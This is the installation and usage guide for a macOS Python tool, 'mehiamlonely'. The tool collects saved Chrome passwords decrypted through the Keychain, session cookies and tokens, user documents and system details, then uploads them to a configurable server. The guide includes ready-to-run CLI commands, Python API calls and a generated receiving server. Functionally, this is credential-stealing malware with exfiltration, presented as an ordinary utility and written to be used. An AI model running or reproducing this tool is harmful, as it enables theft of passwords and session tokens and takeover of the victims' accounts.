# Installation and Usage Guide

## Installation

```bash
# Install from PyPI (when published)
pip install mehiamlonely

# Or install from source
git clone <your-repo>
cd mehiamlonely
pip install -e .
```

## Quick Start

### 1. Create a Test Server

```bash
# Generate sample FastAPI server
mehiamlonely --create-server

# Run the server (in another terminal)
python sample_server.py
```

### 2. Extract and Upload Data

```bash
# Basic extraction and upload
mehiamlonely --server http://localhost:8000

# With verbose output to see what's being extracted
mehiamlonely --server http://localhost:8000 --verbose

# Save data locally AND upload to server
mehiamlonely --server http://localhost:8000 --output my_data.json

# Upload actual files (not just metadata)
mehiamlonely --server http://localhost:8000 --upload-files

# Test connection without extracting data
mehiamlonely --server http://localhost:8000 --test-connection
```

## Programmatic Usage

```python
import mehiamlonely.mehiamlonely_main as main
import asyncio

# Extract all data
data = main.extract_all_data()

# Extract specific components
chrome_data = main.extract_chrome_data()
files = main.extract_system_files(max_files=100)
system_info = main.extract_system_info()

# Upload to server
result = asyncio.run(main.upload_all_data("http://localhost:8000", data))
print("Upload successful:", result["success"])
```

## What Gets Extracted

### Chrome Data
- **Passwords**: Saved login credentials (decrypted using macOS Keychain)
- **Cookies**: Session cookies and authentication tokens  
- **Bookmarks**: All saved bookmarks
- **Profiles**: Multiple Chrome profiles and their settings
- **Preferences**: Browser settings and installed extensions

### File System Data
- **User Files**: Desktop, Documents, Downloads, Pictures, Movies, Music, Public
- **Applications**: Installed applications from /Applications and /System/Applications
- **File Metadata**: Size, modification date, permissions, file extensions

### System Information
- **Hardware**: CPU count, total memory, disk usage per partition
- **Processes**: Running applications (limited to 100 for performance)
- **User Info**: Username, hostname, home directory path

## Security Notes

- Uses macOS Keychain for Chrome password decryption
- Only accesses files you have permission to read
- No data is stored locally unless you specify `--output`
- All server communication is over HTTP/HTTPS
- Chrome database files are copied to temp locations to avoid locks

## API Endpoints

Your FastAPI server should implement:

- `GET /api/health` - Health check endpoint
- `POST /api/extract` - Receive extracted data JSON
- `POST /api/upload-file` - Receive uploaded files
- `GET /api/data/{client_id}` - Retrieve stored data
- `GET /api/files` - List uploaded files

## Troubleshooting

### Chrome Password Decryption Issues
- Ensure Chrome is installed and has saved passwords
- The tool uses macOS Keychain - you may need to grant permissions
- Some passwords may not decrypt if Chrome uses newer encryption

### File Access Issues
- The tool only accesses files you have permission to read
- System files in protected directories will be skipped
- Large file uploads are limited to avoid overwhelming the server

### Server Connection Issues
- Test connection first: `mehiamlonely --server <url> --test-connection`
- Check if your server implements the required endpoints
- Use `--verbose` flag to see detailed error messages
